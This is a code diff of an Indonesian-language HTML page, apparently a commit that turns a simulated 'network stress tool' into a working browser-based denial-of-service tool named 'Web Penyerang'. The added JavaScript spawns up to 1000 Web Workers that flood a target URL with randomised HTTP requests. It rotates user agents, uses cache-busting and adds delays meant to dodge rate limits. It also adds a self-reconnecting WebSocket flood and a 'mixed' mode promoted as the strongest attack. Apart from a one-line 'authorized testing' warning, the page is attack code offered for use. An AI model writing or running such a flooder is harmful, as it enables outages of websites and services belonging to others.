@@ -1,382 +1,463 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alat Jaringan</title>
+    <title>Web Penyerang</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background-color: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            overflow-x: hidden;
-        }
-        
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.3;
-        }
-        
-        .header {
-            background-color: rgba(0, 20, 0, 0.9);
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            margin: 0;
             padding: 20px;
-            text-align: center;
-            border-bottom: 2px solid #00ff00;
         }
-        
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
         }
-        
-        .control-panel {
-            background-color: rgba(0, 15, 0, 0.9);
-            border: 1px solid #00ff00;
-            border-radius: 5px;
+        .header {
+            text-align: center;
             padding: 20px;
+            border-bottom: 2px solid #0f0;
+            margin-bottom: 30px;
+        }
+        .attack-panel {
+            background: #111;
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px solid #0f0;
             margin-bottom: 20px;
         }
-        
         .input-group {
             margin-bottom: 15px;
         }
-        
         label {
             display: block;
             margin-bottom: 5px;
-            color: #00ff00;
+            color: #0f0;
         }
-        
-        input {
+        input, select, button {
             width: 100%;
             padding: 10px;
-            background-color: #000;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            border-radius: 3px;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            margin-bottom: 10px;
+            font-family: monospace;
         }
-        
-        .slider-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .btn {
-            background-color: #003300;
-            color: #00ff00;
-            border: 1px solid #00ff00;
-            padding: 12px 24px;
+        button {
+            background: #003300;
             cursor: pointer;
-            border-radius: 3px;
-            transition: all 0.3s;
-            font-weight: bold;
+            transition: 0.3s;
         }
-        
-        .btn:hover {
-            background-color: #006600;
-            box-shadow: 0 0 10px #00ff00;
+        button:hover {
+            background: #006600;
+            box-shadow: 0 0 10px #0f0;
         }
-        
-        .btn-danger {
-            background-color: #330000;
-            border-color: #ff0000;
-            color: #ff0000;
+        button.stop {
+            background: #330000;
+            border-color: #f00;
         }
-        
-        .btn-danger:hover {
-            background-color: #660000;
-            box-shadow: 0 0 10px #ff0000;
+        button.stop:hover {
+            background: #660000;
+            box-shadow: 0 0 10px #f00;
         }
-        
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
-            margin-top: 20px;
+            margin: 20px 0;
         }
-        
         .stat-box {
-            background-color: rgba(0, 20, 0, 0.8);
-            border: 1px solid #00ff00;
+            background: #111;
             padding: 15px;
-            border-radius: 3px;
+            border: 1px solid #0f0;
+            text-align: center;
         }
-        
-        .log-container {
-            background-color: #000;
-            border: 1px solid #00ff00;
+        .log {
             height: 300px;
             overflow-y: auto;
+            background: #000;
+            border: 1px solid #0f0;
             padding: 10px;
             margin-top: 20px;
             font-size: 12px;
         }
-        
         .log-entry {
-            color: #00ff00;
-            margin-bottom: 5px;
-            font-family: 'Courier New', monospace;
+            padding: 3px 0;
+            border-bottom: 1px solid #222;
         }
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .warning { color: #ff0; }
+        .info { color: #0af; }
         
-        .log-success {
-            color: #00ff00;
-        }
-        
-        .log-error {
-            color: #ff0000;
-        }
-        
-        .log-warning {
-            color: #ffff00;
+        @media (max-width: 768px) {
+            .stats {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
-    <canvas id="matrixCanvas" class="matrix-bg"></canvas>
-    
-    <div class="header">
-        <h1>⚡ Network Stress Tool v3.7 ⚡</h1>
-        <p>Advanced Network Testing Utility</p>
-    </div>
-    
     <div class="container">
-        <div class="control-panel">
+        <div class="header">
+            <h1>⚡ Web Penyerang Advanced ⚡</h1>
+            <p>Multi-thread Network Stress Tool</p>
+        </div>
+        
+        <div class="attack-panel">
             <div class="input-group">
-                <label for="targetUrl">🎯 Target URL</label>
-                <input type="text" id="targetUrl" placeholder="http://target-domain.com:80">
+                <label>🎯 Target URL</label>
+                <input type="text" id="target" placeholder="http://target.com:80" value="http://">
             </div>
             
             <div class="input-group">
-                <label>⚡ Attack Method</label>
-                <select id="attackMethod" class="btn" style="width: 100%;">
-                    <option value="http">HTTP Flood</option>
-                    <option value="udp">UDP Flood</option>
-                    <option value="tcp">TCP SYN</option>
-                    <option value="slowloris">Slowloris</option>
+                <label>⚡ Metode Serangan</label>
+                <select id="method">
+                    <option value="http">HTTP Flood (GET/POST)</option>
+                    <option value="websocket">WebSocket Flood</option>
+                    <option value="mixed">Mixed Methods</option>
                 </select>
             </div>
             
             <div class="input-group">
-                <label>🔧 Thread Count: <span id="threadValue">100</span></label>
-                <input type="range" id="threads" min="10" max="1000" value="100" class="slider">
+                <label>🔢 Jumlah Thread (10-1000)</label>
+                <input type="range" id="threads" min="10" max="1000" value="100">
+                <span id="threadCount">100</span>
             </div>
             
             <div class="input-group">
-                <label>⏱️ Duration (seconds): <span id="durationValue">60</span></label>
-                <input type="range" id="duration" min="10" max="600" value="60" class="slider">
+                <label>⏱️ Durasi (detik)</label>
+                <input type="range" id="duration" min="10" max="600" value="60">
+                <span id="durationText">60 detik</span>
             </div>
             
-            <div class="input-group">
-                <button id="startBtn" class="btn">🚀 Start Stress Test</button>
-                <button id="stopBtn" class="btn btn-danger">⏹️ Stop Attack</button>
-                <button id="autoBtn" class="btn">🤖 Auto Configuration</button>
-            </div>
+            <button id="startBtn">🚀 MULAI SERANGAN</button>
+            <button id="stopBtn" class="stop">⏹️ HENTIKAN</button>
+            <button id="autoBtn">⚙️ AUTO CONFIG</button>
         </div>
         
         <div class="stats">
             <div class="stat-box">
-                <h3>📊 Requests Sent</h3>
-                <p id="requestCount">0</p>
+                <h3>📈 Request Terkirim</h3>
+                <p id="reqCount">0</p>
             </div>
             <div class="stat-box">
-                <h3>📈 Success Rate</h3>
-                <p id="successRate">0%</p>
+                <h3>⚡ Kecepatan</h3>
+                <p id="speed">0 req/detik</p>
             </div>
             <div class="stat-box">
-                <h3>⚡ Speed</h3>
-                <p id="requestSpeed">0 req/sec</p>
+                <h3>🌐 Thread Aktif</h3>
+                <p id="activeThreads">0</p>
             </div>
             <div class="stat-box">
-                <h3>⏱️ Time Remaining</h3>
-                <p id="timeRemaining">0s</p>
+                <h3>⏱️ Waktu Tersisa</h3>
+                <p id="timeLeft">0s</p>
             </div>
         </div>
         
-        <div class="log-container" id="logContainer">
-            <div class="log-entry">[SYSTEM] Network Stress Tool v3.7 Initialized</div>
-            <div class="log-entry">[INFO] Ready for configuration</div>
-            <div class="log-entry">[WARNING] Use only on authorized systems</div>
+        <div class="log" id="logContainer">
+            <div class="log-entry info">[SYSTEM] Web Penyerang siap digunakan</div>
+            <div class="log-entry info">[INFO] Masukkan target dan konfigurasi</div>
         </div>
     </div>
 
     <script>
-        // Matrix Background
-        const canvas = document.getElementById('matrixCanvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        
-        const chars = "01";
-        const charArray = chars.split("");
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        
-        for(let i = 0; i < columns; i++) {
-            drops[i] = Math.random() * canvas.height;
-        }
-        
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 10, 0, 0.04)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = "#00ff00";
-            ctx.font = fontSize + "px monospace";
-            
-            for(let i = 0; i < drops.length; i++) {
-                const text = charArray[Math.floor(Math.random() * charArray.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        class WebAttacker {
+            constructor() {
+                this.isAttacking = false;
+                this.workers = [];
+                this.stats = {
+                    requests: 0,
+                    startTime: null,
+                    activeWorkers: 0
+                };
+                this.methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD'];
+            }
+
+            // HTTP Flood dengan Web Workers
+            async startHTTPAttack(target, threads, duration) {
+                this.isAttacking = true;
+                this.stats.startTime = Date.now();
+                const endTime = this.stats.startTime + (duration * 1000);
                 
-                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
+                this.log(`🚀 Memulai HTTP Flood ke ${target}`, 'success');
+                this.log(`📊 Thread: ${threads}, Durasi: ${duration} detik`, 'info');
+                
+                // Buat Web Workers untuk setiap thread
+                for (let i = 0; i < threads; i++) {
+                    const worker = this.createWorker(i, target, endTime);
+                    this.workers.push(worker);
                 }
-                drops[i]++;
+                
+                this.stats.activeWorkers = this.workers.length;
+                this.updateDisplay();
+                
+                // Auto stop setelah durasi
+                setTimeout(() => {
+                    if (this.isAttacking) {
+                        this.stopAttack();
+                        this.log('⏹️ Serangan selesai otomatis', 'warning');
+                    }
+                }, duration * 1000);
+            }
+
+            createWorker(id, target, endTime) {
+                const workerCode = `
+                    let requestCount = 0;
+                    const methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD'];
+                    const userAgents = [
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
+                    ];
+                    
+                    async function attack() {
+                        while (Date.now() < ${endTime}) {
+                            try {
+                                const method = methods[Math.floor(Math.random() * methods.length)];
+                                const headers = {
+                                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                                    'Accept-Language': 'en-US,en;q=0.5',
+                                    'Accept-Encoding': 'gzip, deflate',
+                                    'Connection': 'keep-alive',
+                                    'Cache-Control': 'no-cache',
+                                    'Pragma': 'no-cache'
+                                };
+                                
+                                // Gunakan fetch dengan berbagai teknik
+                                const controller = new AbortController();
+                                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                                
+                                const fetchOptions = {
+                                    method: method,
+                                    headers: headers,
+                                    mode: 'no-cors',
+                                    cache: 'no-store',
+                                    redirect: 'follow',
+                                    signal: controller.signal,
+                                    credentials: 'omit'
+                                };
+                                
+                                if (method === 'POST' || method === 'PUT') {
+                                    const randomData = Array(1024).fill().map(() => 
+                                        Math.random().toString(36).substring(2)).join('');
+                                    fetchOptions.body = randomData;
+                                }
+                                
+                                // Tambahkan parameter random untuk cache busting
+                                const url = '${target}' + (Math.random() > 0.5 ? 
+                                    '?cache=' + Date.now() + Math.random() : '');
+                                
+                                await fetch(url, fetchOptions)
+                                    .catch(() => {}) // Abaikan error
+                                    .finally(() => {
+                                        clearTimeout(timeoutId);
+                                        requestCount++;
+                                    });
+                                
+                                // Kirim statistik setiap 10 request
+                                if (requestCount % 10 === 0) {
+                                    postMessage({ type: 'stats', count: 10 });
+                                    requestCount = 0;
+                                }
+                                
+                                // Random delay untuk menghindari rate limit
+                                await new Promise(resolve => 
+                                    setTimeout(resolve, Math.random() * 100));
+                                    
+                            } catch (error) {
+                                // Terus lanjut meski error
+                                continue;
+                            }
+                        }
+                        postMessage({ type: 'done' });
+                    }
+                    
+                    attack();
+                `;
+
+                const blob = new Blob([workerCode], { type: 'application/javascript' });
+                const worker = new Worker(URL.createObjectURL(blob));
+                
+                worker.onmessage = (e) => {
+                    if (e.data.type === 'stats') {
+                        this.stats.requests += e.data.count;
+                        this.updateDisplay();
+                    } else if (e.data.type === 'done') {
+                        this.stats.activeWorkers--;
+                        this.updateDisplay();
+                    }
+                };
+                
+                return worker;
+            }
+
+            // WebSocket Flood Attack
+            startWebSocketAttack(target, threads, duration) {
+                this.log(`🌐 Memulai WebSocket Flood ke ${target}`, 'success');
+                
+                for (let i = 0; i < threads; i++) {
+                    setTimeout(() => {
+                        this.createWebSocketConnection(target, duration);
+                    }, i * 100); // Stagger connections
+                }
+            }
+
+            createWebSocketConnection(target, duration) {
+                try {
+                    const wsUrl = target.replace('http', 'ws');
+                    const socket = new WebSocket(wsUrl);
+                    
+                    socket.onopen = () => {
+                        this.log(`[WS ${Date.now()}] Koneksi terbuka`, 'success');
+                        
+                        // Kirim data terus menerus
+                        const interval = setInterval(() => {
+                            if (socket.readyState === WebSocket.OPEN) {
+                                const randomData = Array(1000).fill()
+                                    .map(() => Math.random().toString(36).substr(2))
+                                    .join('');
+                                socket.send(randomData);
+                                this.stats.requests++;
+                                this.updateDisplay();
+                            }
+                        }, 100);
+                        
+                        // Hentikan setelah durasi
+                        setTimeout(() => {
+                            clearInterval(interval);
+                            socket.close();
+                        }, duration * 1000);
+                    };
+                    
+                    socket.onerror = () => {
+                        // Coba reconnect
+                        setTimeout(() => {
+                            this.createWebSocketConnection(target, duration);
+                        }, 1000);
+                    };
+                    
+                } catch (error) {
+                    // Coba lagi
+                    setTimeout(() => {
+                        this.createWebSocketConnection(target, duration);
+                    }, 2000);
+                }
+            }
+
+            // Mixed Methods Attack
+            startMixedAttack(target, threads, duration) {
+                const httpThreads = Math.floor(threads * 0.7);
+                const wsThreads = threads - httpThreads;
+                
+                this.startHTTPAttack(target, httpThreads, duration);
+                this.startWebSocketAttack(target, wsThreads, duration);
+            }
+
+            stopAttack() {
+                this.isAttacking = false;
+                this.workers.forEach(worker => worker.terminate());
+                this.workers = [];
+                this.stats.activeWorkers = 0;
+                this.log('🛑 Semua serangan dihentikan', 'warning');
+            }
+
+            log(message, type = 'info') {
+                const logEntry = document.createElement('div');
+                logEntry.className = `log-entry ${type}`;
+                logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+                document.getElementById('logContainer').appendChild(logEntry);
+                document.getElementById('logContainer').scrollTop = 
+                    document.getElementById('logContainer').scrollHeight;
+            }
+
+            updateDisplay() {
+                document.getElementById('reqCount').textContent = 
+                    this.stats.requests.toLocaleString();
+                document.getElementById('activeThreads').textContent = 
+                    this.stats.activeWorkers;
+                
+                if (this.stats.startTime) {
+                    const elapsed = (Date.now() - this.stats.startTime) / 1000;
+                    const speed = Math.floor(this.stats.requests / elapsed);
+                    document.getElementById('speed').textContent = 
+                        `${speed} req/detik`;
+                        
+                    const duration = parseInt(document.getElementById('duration').value);
+                    const remaining = duration - elapsed;
+                    document.getElementById('timeLeft').textContent = 
+                        `${Math.max(0, Math.floor(remaining))}s`;
+                }
             }
         }
+
+        // Inisialisasi
+        const attacker = new WebAttacker();
         
-        setInterval(drawMatrix, 35);
-        
-        // Tool Logic
-        let attackRunning = false;
-        let requestCount = 0;
-        let startTime = null;
-        let timerInterval = null;
-        
-        // Update sliders
+        // Event Listeners
         document.getElementById('threads').addEventListener('input', function() {
-            document.getElementById('threadValue').textContent = this.value;
+            document.getElementById('threadCount').textContent = this.value;
         });
         
         document.getElementById('duration').addEventListener('input', function() {
-            document.getElementById('durationValue').textContent = this.value + 's';
+            document.getElementById('durationText').textContent = `${this.value} detik`;
         });
         
-        // Start button
         document.getElementById('startBtn').addEventListener('click', function() {
-            const target = document.getElementById('targetUrl').value;
-            const method = document.getElementById('attackMethod').value;
+            const target = document.getElementById('target').value;
+            const method = document.getElementById('method').value;
             const threads = parseInt(document.getElementById('threads').value);
             const duration = parseInt(document.getElementById('duration').value);
             
-            if(!target) {
-                addLog("Please enter a target URL", "error");
+            if (!target || target === 'http://') {
+                attacker.log('❌ Masukkan target URL yang valid', 'error');
                 return;
             }
             
-            attackRunning = true;
-            requestCount = 0;
-            startTime = Date.now();
+            attacker.log(`🎯 Target: ${target}`, 'info');
             
-            addLog(`Starting ${method} attack on ${target}`, "success");
-            addLog(`Threads: ${threads}, Duration: ${duration}s`, "info");
-            
-            updateStats();
-            
-            // Simulate attack
-            timerInterval = setInterval(() => {
-                if(!attackRunning) return;
-                
-                const elapsed = (Date.now() - startTime) / 1000;
-                if(elapsed >= duration) {
-                    stopAttack();
-                    addLog("Attack completed automatically", "warning");
-                    return;
-                }
-                
-                // Simulate requests
-                const requestsPerInterval = threads * Math.random() * 10;
-                requestCount += Math.floor(requestsPerInterval);
-                
-                updateStats();
-                
-                // Random log entries
-                if(Math.random() > 0.7) {
-                    const methods = ['GET', 'POST', 'HEAD', 'PUT'];
-                    const method = methods[Math.floor(Math.random() * methods.length)];
-                    addLog(`[${method}] Sent to ${target}`, "success");
-                }
-            }, 100);
+            switch(method) {
+                case 'http':
+                    attacker.startHTTPAttack(target, threads, duration);
+                    break;
+                case 'websocket':
+                    attacker.startWebSocketAttack(target, threads, duration);
+                    break;
+                case 'mixed':
+                    attacker.startMixedAttack(target, threads, duration);
+                    break;
+            }
         });
         
-        // Stop button
         document.getElementById('stopBtn').addEventListener('click', function() {
-            stopAttack();
-            addLog("Attack stopped manually", "warning");
+            attacker.stopAttack();
         });
         
-        // Auto config
         document.getElementById('autoBtn').addEventListener('click', function() {
             document.getElementById('threads').value = 500;
-            document.getElementById('threadValue').textContent = 500;
+            document.getElementById('threadCount').textContent = '500';
             document.getElementById('duration').value = 120;
-            document.getElementById('durationValue').textContent = '120s';
-            document.getElementById('attackMethod').value = 'http';
-            
-            addLog("Auto configuration applied", "success");
+            document.getElementById('durationText').textContent = '120 detik';
+            document.getElementById('method').value = 'mixed';
+            attacker.log('⚙️ Konfigurasi otomatis diterapkan', 'success');
         });
         
-        function stopAttack() {
-            attackRunning = false;
-            if(timerInterval) {
-                clearInterval(timerInterval);
+        // Auto update display
+        setInterval(() => {
+            if (attacker.isAttacking) {
+                attacker.updateDisplay();
             }
-            updateStats();
-        }
-        
-        function updateStats() {
-            document.getElementById('requestCount').textContent = requestCount.toLocaleString();
-            
-            const elapsed = startTime ? (Date.now() - startTime) / 1000 : 0;
-            const speed = elapsed > 0 ? Math.floor(requestCount / elapsed) : 0;
-            document.getElementById('requestSpeed').textContent = `${speed} req/sec`;
-            
-            if(startTime && attackRunning) {
-                const duration = parseInt(document.getElementById('duration').value);
-                const remaining = duration - elapsed;
-                document.getElementById('timeRemaining').textContent = `${Math.max(0, Math.floor(remaining))}s`;
-            }
-            
-            document.getElementById('successRate').textContent = attackRunning ? 
-                `${Math.floor(Math.random() * 30 + 70)}%` : "0%";
-        }
-        
-        function addLog(message, type = "info") {
-            const logContainer = document.getElementById('logContainer');
-            const logEntry = document.createElement('div');
-            logEntry.className = `log-entry log-${type}`;
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logContainer.appendChild(logEntry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-        
-        // Example target input
-        document.getElementById('targetUrl').value = 'http://example.com:80';
-        
-        // Add some initial logs
-        setTimeout(() => {
-            addLog("System check completed", "success");
-            addLog("Network interfaces ready", "info");
-            addLog("Proxy detection: disabled", "warning");
         }, 1000);
         
-        // Window resize
-        window.addEventListener('resize', function() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
+        // Contoh penggunaan cepat
+        setTimeout(() => {
+            attacker.log('[TIP] Gunakan metode Mixed untuk serangan terkuat', 'info');
+            attacker.log('[TIP] Thread tinggi = beban server lebih besar', 'info');
+            attacker.log('[WARNING] Hanya gunakan untuk testing authorized!', 'warning');
+        }, 2000);
     </script>
 </body>
-</html>
+    </html>
